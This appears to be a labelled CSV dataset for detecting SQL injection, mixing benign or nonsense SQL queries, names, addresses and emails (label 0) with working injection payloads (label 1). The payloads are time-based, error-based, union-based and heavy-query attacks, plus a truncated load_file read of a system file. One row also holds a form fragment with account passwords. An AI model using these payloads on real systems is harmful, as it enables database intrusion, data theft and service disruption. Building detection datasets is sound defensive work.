Query,Label
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",1
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )",1
SELECT COUNT ( noseID ) FROM fastened,0
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",1
SELECT lunch ( s )  FROM date LEFT JOIN,0
antonio ulloa 6 6?d,0
SELECT * FROM film WHERE worse  BETWEEN 10 AND 20,0
"SELECT tribe, why, cat FROM according WHERE plan  IS NULL",0
"SELECT behind, excitement, cardFROM exact WHERE disease  IS NOT NULL",0
"-9265""  )   or 7834  =  1685",1
"SELECT * FROM cotton WHERE bar NOT IN  ( 'addition', 'off', 'page' )",0
"SELECT COUNT ( useful ) , express FROM merely BY tobacco",0
"1%'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  '%'  =  '",1
51285362p,0
-1470'   )    )     )   or 9323  =  9323#,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239190 )  ORDER BY meta_id ASC",0
SELECT * FROM me WHERE birds = 'silk'  OR experience = 'neighborhood',0
49439340n,0
medwin-whittinghill@enla.th,0
"1' where 7104  =  7104 union all select null,null,null,null,null,null,null#",1
3146,0
"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""kzcd""  =  ""kzcd",1
4631,0
eugen-fargue@andrestabernero.im,0
SELECT joy ( s )  FROM belt SELECT surrounded FROM driving,0
"SELECT * FROM boat WHERE equipment NOT IN  ( 'calm', 'blue', 'except' )",0
casademonts,0
"SELECT * FROM species ORDER BY steel, drop",0
"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",1
50228,0
"select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1
"-6093'  )   where 9676  =  9676 union all select 9676,9676,9676,9676,9676,9676--",1
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM  ( SELECT instrument FROM busy ),0
etienne-wray@juegois.je,0
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )",1
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  '%'  =  ',1
autonell,0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
a7av5nc6,0
"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",1
SELECT * FROM edge,0
SELECT AVG ( game ) FROM stage SELECT SUM ( subject ),0
SELECT * FROM thin WHERE    NOT object = 'reason',0
senen,0
5.49426E+15,0
SELECT fresh ( s )  FROM growth SELECT electric ( s ),0
indocto,0
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr",1
"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",1
SELECT * FROM roar ORDER BY represent,0
SELECT * FROM occasionally WHERE headed NOT BETWEEN 'firm' AND 'thin',0
1'+  (  select 'qylf' where 6984  =  6984 and 2255  =  5094,1
"SELECT * FROM broad WHERE orange IN  ( 'coach', 'breakfast', 'respect' )",0
jose cadalso s/n 7d,0
"INSERT INTO north ( living, surface, author, desk, straw, sit )  VALUES  ( 'fuel', 'strip'. which', 'trick', 'instrument', 'weigh', 'inch' )",0
SELECT * FROM spend WHERE gas = 'weather'  AND  ( research = 'rising' OR mine = 'molecular' ),0
sims2@videocasa-ebs.ru,0
SELECT AVG ( bat ) FROM earn,0
SELECT * FROM  ( SELECT hollow FROM actual ),0
SELECT * FROM edge WHERE electric = 'flies'  OR saw = 'shaking',0
piejo,0
1'+  (  select 'ljtl' where 1766  =  1766,1
"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",1
peaflor de hornija,0
ostyn.martan@icodea.lu,0
SELECT more ( s )  FROM bread UNION ALL,0
pesquisar,0
86274990n,0
"1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
1'  )   where 5491  =  5491 and 9198  =  9198--,1
cruz,0
SELECT * FROM solid FETCH FIRST 50 PERCENT ROWS ONLY,0
-8099%'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_doing_cron' LIMIT 1,0
SELECT * FROM important WHERE hour = 'increase' LIMIT 3,0
SELECT * FROM straight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM travel,0
"1""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""vfoh""  =  ""vfoh",1
"1""   )    )     )   order by 1#",1
"SELECT married, dug, zeroFROM work WHERE dollar  IS NOT NULL",0
SELECT COUNT ( valueID ) FROM he,0
26987451x,0
-1217'   )    )     )   order by 1#,1
"1%""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,1
"INSERT INTO move  ( try, think, within )  VALUES  ( 'conversation', 'separate', 'calm' )",0
"SELECT longID AS ID, sides AS audience FROM cutting",0
SELECT option_value FROM wp_options WHERE option_name  =  'options_instagram_url' LIMIT 1,0
"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",1
"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",1
tacita,0
"SELECT Employees.captain, COUNT ( Orders.redID )  AS equallyFROM    ( OrdersINNER JOIN scientific ON Orders.wheneverID  =  Employees.smallID )",0
SELECT MIN ( fighting )  AS send FROM automobile,0
clica,0
SELECT * FROM pan WHERE thumb = 'fair'  OR nature = 'pole',0
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",1
SELECT * FROM Customers  WHERE NOT Country = 'Germany' AND NOT Country = 'USA';,0
1'   )    )    as iuta where 1482  =  1482,1
"SELECT were,during,said FROM word LEFT JOIN Orders ON science.noneID =  star.rich ORDER BY congress.part",0
"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",1
SELECT COUNT ( action )  FROM title,0
"INSERT INTO nice ( plan, soft, paint, continent, appearance, handsome )  VALUES  ( 'sink', 'win'. ask', 'twice', 'importance', 'foreign', 'in' )",0
SELECT TOP 50 PERCENT * FROM cross,0
srinivas,0
"SELECT stared AS else, poetry AS [sand]  FROM split",0
SELECT test ( s )  FROM desert SELECT mysterious FROM sides,0
"SELECT Orders.musicalrID, Employees.figure, Employees.between FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forgetID ORDER BY Orders.circusID",0
SELECT * FROM tired WHERE west = 'been',0
8282,0
"-9456%""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""%""  =  """,1
SELECT * FROM related WHERE older = 'per' FETCH FIRST 3 ROWS ONLY,0
"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",1
SELECT AVG ( unusual ) FROM drink SELECT SUM ( guess ),0
SELECT AVG ( comfortable ) FROM health,0
c/ gomera 148 3?e,0
select   (  case when   (  4769  =  4769  )   then 4769 else 4769*  (  select 4769 from mysql.db  )   end  )  #,1
SELECT * FROM instant WHERE forgotten LIKE '%third%',0
SELECT * FROM getting WHERE visitor LIKE '%pictured%',0
h958013a,0
SELECT chosen FROM search,0
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
"c/ la estrella, 182",0
SELECT TOP 50 PERCENT * FROM manufacturing,0
1'+  (  select iwbs where 4939  =  4939,1
9224,0
1 where 7299  =  7299 rlike sleep  (  5  )  --,1
odelsia,0
1'||  (  select 'scct' where 2587  =  2587 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',1
1  )   as oknr where 3228  =  3228,1
SELECT COUNT ( funny ) FROM damage,0
"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",1
1'+  (  select ankx where 6789  =  6789,1
"SELECT Orders.intorID, Employees.exact, Employees.grain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.keptID ORDER BY Orders.lossID",0
"INSERT INTO pressure ( giving, prize, powder, mail, work, common )  VALUES  ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )",0
fickes,0
"-9601'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"plaa doctor robert, 127",0
SELECT function ( s )  FROM whispered FULL OUTER JOIN,0
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",1
o$ficinesca,0
"SELECT fruitID AS ID, aware AS select FROM society",0
SELECT * FROM short WHERE feel LIKE '%plain%',0
SELECT * FROM become WHERE spend BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT DISTINCT composed FROM figure,0
SELECT chart FROM declared UNION SELECT indeed FROM concerned ORDER BY were,0
"1%""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
SELECT * FROM birth WHERE basic = 'square'  AND City = 'movement',0
70136564l,0
"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",1
SELECT * FROM difficult WHERE Price NOT BETWEEN 10 AND 20,0
"-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--",1
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",1
select * from users where id  =  1.*1 or 1  =  1 -- 1,1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_site_logo' LIMIT 1,0
1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT COUNT ( thirty ) FROM bar,0
"de]]>  </email_address>   <find_account_answer>  <![CDATA[fqaepqdkct]]>  </find_account_answer>   <find_account_question>  <![CDATA[6]]>  </find_account_question>   <homepage>  <![CDATA[]]>  </homepage>   <is_secret>  <![CDATA[]]>  </is_secret>   <methodCall>   <mid>  <![CDATA[qna]]>  </mid>   <module>  <![CDATA[member]]>  </module>   <nick_name>  <![CDATA[ElwoodBuckley041104]]>  </nick_name>   <params>   <password2>  <![CDATA[Yxg6dsF5iU]]>  </password2>   <password>  <![CDATA[Yxg6dsF5iU]]>  </password>   <reward_point>  <![CDATA[0]]>  </reward_point>   <title>  <![CDATA[Ways To Make Cash Online - Make Money From Home]]>  </title>   <user_id>  <![CDATA[ElwoodBuckley041104]]>  </user_id>   <user_name>  <![CDATA[ElwoodBuckley041104]]>  </user_name>    =    =     =    =  01 @7520 A3B10 A3B12C41 A3B12C411 APP AR-203 ASCd AgAHMzM3MsdfjMwMExG6Pvz1i3DhGd7DSt5Ve9Qu/n91BdfdEB5EbdeO/M5lphLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjaDz2yHm9tJWbLuELC/JM8Eix/VtyWmMO5osa8FbYZnPanAxI7Ty0n7avQytu2rEK2F+N+C390zLVThtSXL1Isk49OSEWuEAzdaRlmLUWcpx6XSDjFZ++1cgwEoAILJ9Q5NObm6nYipbGovJ6YZgiEncnT9GU6x6sgKNppX0YgXXmss+0Qi5eXWmDn30UlwjfTbmc+Ta17XLDXGm6f/hiM7f4fde+5c+Pavn9EIZXYe9K6G/GyCM7I0dzjPIsjEOwl96y+fYXoZoJcp79kLwtTy6F1dL1HAs8DSFoIrfoUs7zyFtzgMnV2K0sT68IwWkiof2eM1Xes5nbDzmHOEQZ+loGLF2UBIyGcz4cSCtdZhrJXt7TxSIzeHKYpCgtVhNo4zJDlHo7zpUnR+8dSlUsdf18e08zs4iGMRK43bhv6oGA6dUw/dX+exrGTL+NMOThQUQvFdYNsc+AFGWo3PqLFhjQ9s3RzK5krr6II3e2vKhs36q7NgNgaIlQNiqNo8cNbE8iVUxZcHhvxaOStpiUN+N9KY4sZ51Ole8offosPb1NqXs3575SXU+1dEpaggUrUJqKjeUM4Hu90KoHmbL2+/zt6Bk+GCnk2WBKJENscEetfLBCBzBGXPlKC7/G5W4k8Gviynn4qCUoD9FvagtKTTF4MaA5rZtrKRabUae++259WRUZ3VEHfzjpXLaogS9DoeVHDebAClkkuAdU6F6fa2wFIM58  =   AgAHMzM3MjMwMJnS2WotX5wisoSRNiccx9VSfDnC/TFaDo/9wddE55SqhLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjDz2yHsm9tJWa4Oyj22HdAIrJSshxe0KmKTxD4lBsReQqG6IN3ULz8oaEwMT7lKcx4Ukfep1IwCe7xHXlsW2gCFxdZmh731jKLuFDn/9rcY4AkdgqajLoHmVnLk3uBcTxbQS8XWJJk8++VnGu9toYSualxl0CgjSRgl01ddYqiaVYQOBShAcHCdfbHmbDZIPrPowSVFUAGpYsVDx3fVEdDa8NKRAPMI3wAlq40FqZDdhNXNr70OL9ZRzS82kWdHP8w2hd1KcIheAxDSw4a5FLAjzSWrdjcOvUfJQO5QT/90J19i2IWnuTNIdTzOcf3uVy23sHyWmsBEWHyaSsKDm7dfOPPwHIWamQKkdcm5KoWp/FgoIR09S0cn/BZzLOsdcFSbhYOxA  =    =   B_qna B_solution Bn2GepSdoAsdfe4V4a1@V$K@Bn2GepSdoAe4V4a1@23V$K@PlVEBnTVHAYa01hH@V$K@eTZyMZ0F3YBl4Ozr@V$K@Bn2GepSdoAe4V4a1@V$K@xJ8t+K+x1e6/nqCp@V$a1K@PLnd8fSYoXD3QL3s Board00001 C CYsdfSL7J/aXGaV/30TU412JWfjHA  =    =   Cont Content-Disposi Content-Disposition: form- Content-Disposition: form-data; name  =  ""app"" Content-Disposition: form-data; name  =  ""cd_loan_type"" Content-Disposition: form-data; name  =  ""id_finance"" Content-Disposition: form-data; name  =  ""mode"" Content-Disposition: form-data; name  =  ""no"" Content-Disposition: form-data; name  =  ""no_goods"" Content-Disposition: form-data; name  =  ""path"" Content-Disposition: form-data; name  =  ""pnm"" Content-Disposition: form-data; name  =  ""return_page"" Content-Disposition: form-data; name  =  ""type"" D2 D3 DC-3000 DF Del E EA F1 F4 F5 F6 FG123P8HQ+vasd0pVzD2O+YlD+v1V2g  =    =   FmsdfVDvlXqIVetUIzs@V$K@Vj+fqZ6TuN123pq1X2w@V$K@dqRLntgax88tXGB3@V$K@R43SsinxoXFCKjAy FmVDvlXqIVetUIzs@V$K@n5aESvV0q4Se1iBn8@Vasd$K@M5IvfWDvvs5y1TnouS@V$K@Vj+fqZ6TuNpq1X2w@V$K@fuvKbfOrsGKtsDsdf7l@V$K@ZtgfO1WcVPD67KFos@V$K@dqRLntgax88tXGB3 Free Fun Hf6DNiDdq1xzaB3bdDT@V$512K@MRn61gAqhi0iae213dd@V$K@Hf6DNisdfDxzaB3bdDT@V$K@rSTgzjcYIY7Iirl+@V$K@iTI/NtJsfFTdH8ah@V$K@Hf6DNiDxzaB3bdDT@V$K@EdodGNxPNEYWbWcs JVwH/8xSq6ezJPYt@V$s23K@vPr4I41U8oeym0BEi+@V$K@3WPcTx1mJ5sBdACl@V$K@3WPcTx1mJ5sBdACl@V$K@QpmadUUMPKv2tSJP@V$K@JVwH/8xSq6ezasdfJPYt@V$K@vPr4IU8oeym0BEi+ L-840 360ml í¸ë¦¬ê±° L-840 450 í¸ë¦¬ê±° L5VSRxv4dfoDXwH+hZ@V$K@T0NO9ASwF7J4gKAh@V$K@VWvmclMqqannOAJf@V$K@ERQVjx2OGeE0Mxdf@V$K@VicBva15FL1xm0WH@Va123$K@T0NO9ASwF7J4gKAh@V$K@VicBva15FL1xm0WH PSC-1 NPP Purchase omnicef without prescri QJt5lWbasdftpJ3yciKW@V$K@Hf6DNi123Dxz1aB3bdDT@V$K@iTI/NtJsfFaTdH8vah@V$K@MRn61gAqhi0iaedd QNA_7 R RandD S SF-1013 SR-600 School TC-100 TP1 TracyJat TzwvXJPEcaaOZ9DhJ0@V$K@6DPV+YkQBHbJYSMo@V$Kw@fykXPjdnQQrXTvasdfSr@V$K@c1LOcyiCkFas+XHzbo@V$K@LIHG/+VLgv8RRGR01123@V$K@TzwvXJPEcOZ9DhJ0@V$K@uiGFBm0312rIUaiuBxk UWxvAe743xrPY10JM@V$K@rojWCf7y+OXORcBK@V$Kv@0AIa2oYla5Nt1ckw3@V$K@GMPMso40NCSoArEA V V0hYD71LOy24uhiN4N@3V$K@L5VSRxv4oDXwH+hZ@Vsdf$K@znwrm3vjnUyJBkle@V$K@OuJAnfBzCHbLSge1 VISITVIEW WJyyJ+94QQ2bZbMjn@V$K@kyzIU123+92FxfeBsdfaTn@V$K@3GcBPScFJ6QQEw12gn@V$K@kyzIU+92FsdxfeBaTn@V$K@kNefOsew6E+LZCD51r@V$K@WJyyJ+94Q4asdfkQbZbMjn@V123$K@WJyyJ+94QQbZbMjn WlDxZ/Xl9Gqymv123SWnoZdkHQ  =    =   WnuIfx55kZ XQg12SK2QaeLWOadsfsa124yeMxePT1Pg  =    =   Y Y&check_name Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y Y29k123ZT1mcmVlJnNlYXJjaasdvFa9pdGVtPSZzZWFyY2hfb3JkZXI9JnVuc2luZ2NvZGUxPTEyNTc3NTU2OTEkljoimdW5zasadfW5nY29kZTI9MTI1Nzc1NTc4123OCZ1asdfbnNpbmdjb232Rl41Mz0mY2F0ZT0mcHdkPQ  =    =  || Y29kZTasdf1xbmEmc2VcwehcmNoX2l0ZW09JnNlYXJjaF9vcmRlcasdj0mdW5zaW5nY29kZTE9MTIc131Nzc1NTY5MSZ1bnNpbmdjb2RlMj0xMjU3NzU1NzczJnVuc2412sasdfqluZ2NvasdfpwZGUzPSZjYXRlPSZwd2Q9|| YM YYkswPo6JL4ZZMkx@V$K@JnrdZp35dfasbHSPasldfp1123x571@V$K@7QbUi7a/9aCtxupAas;ldf@V$K@7QbUi7a/9aCtxupA@V$Ks;dlfsalkl;k@jW4BJJFvS0sJfNr9@V$K@YYkswPo6JL4ZZMkx@V$asdlkfjK@cM7J0WfRkiELyEje YcrJWg5O Yfrhmym9asdfkHyKybz9y@V$K@7asdlfksaldfXRKgdViFaBwTq7N@V$K@Yfrhmym9HyasldfkpoKybz9y@V$K@ZIKXXH1fCD3qlt7L add again_loan_Mobile agree_10_1 agree_20_1 agree_20_2 agree_30_1 agree_30_2 agree_30_3 agree_30_4 agree_40_1 agree_40_2 and1 ap14 application apply2 checkPwd",0
santibez de bjar,0
"-6662""   )    )    union all select 6755--",1
98585223r,0
SELECT needs ( s )  FROM gun FULL OUTER JOIN,0
"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
desnarigada,0
SELECT AVG ( base ) FROM since SELECT SUM ( smallest ),0
aristteles,0
SELECT TOP 50 PERCENT * FROM neighbor SELECT * FROM bone FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM shoot,0
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew",1
"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )",1
"SELECT sold,fully FROM sugar WHERE figure = 'symbol' UNION SELECT garage, had FROM carbon",0
"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""ctrr""  =  ""ctrr",1
"1'   )    )    as mxxd where 7255  =  7255 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",1
20048048y,0
1' and sleep  (  5  )   and 'pfgy'  =  'pfgy,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xonc'  =  'xonc",1
5.88554E+15,0
3151,0
"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"iif  (  5214  =  7412,1,1/0  )",1
albuminmetro,0
9.70863E+15,0
"SELECT hand, cheese+ ', ' + treated+ ' ' + plain+ ', ' + went AS create  FROM test",0
SELECT * FROM Customers  WHERE City LIKE '[a-c]%';,0
64522500w,0
padoan@directoriogratuito.et,0
SELECT TOP number | percent column_name FROM table_name WHERE condition ;,0
"SELECT ISNULL ( """" ) ;",0
SELECT * FROM customs WHERE fifty = 'many',0
SELECT * FROM express WHERE dear = 'sense' LIMIT 3,0
"1%"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,1
SELECT AVG ( horn ) FROM until SELECT SUM ( typical ),0
50200,0
"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
SELECT * FROM hearing,0
"-1339   )    )     )   union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'nbsf' like 'nbsf",1
1   )    )    as rbcf where 1053  =  1053,1
"1%' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT without,0
"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT MIN ( enjoy )  AS truth FROM would,0
6.81924E+15,0
"1""  )   as nyui where 2511  =  2511",1
SELECT fine ( s )  FROM secret SELECT sea FROM nails,0
"1""  )   as ktnq where 9005  =  9005",1
SELECT * FROM noon WHERE combine IN  ( SELECT satellites FROM whom ),0
